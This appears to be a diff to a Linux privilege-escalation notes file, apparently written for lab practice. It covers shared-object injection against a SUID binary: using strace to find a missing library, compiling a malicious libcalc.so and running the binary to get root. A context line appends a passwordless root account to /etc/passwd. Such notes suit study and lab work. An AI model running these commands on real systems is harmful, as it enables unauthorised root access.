@@ -723,6 +723,7 @@ echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
 - To see what is running at the back scene after executing the .so, we use strace 'strace /usr/local/bin/suid-so 2>&1'
 - Hunt for .so file (usually at /home), that is returned as "no such file or directory", using 'strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"'
 - once we identified that /home/user/.config/libcalc.so, is not found, we can create our own libcalc.so using the below libcalc.c and compile using 'gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c'
+- run $/usr/local/bin/suid-so, we should get root
 - https://rootrecipe.medium.com/suid-binaries-27c724ef753c
 ```c
 #include <stdio.h>
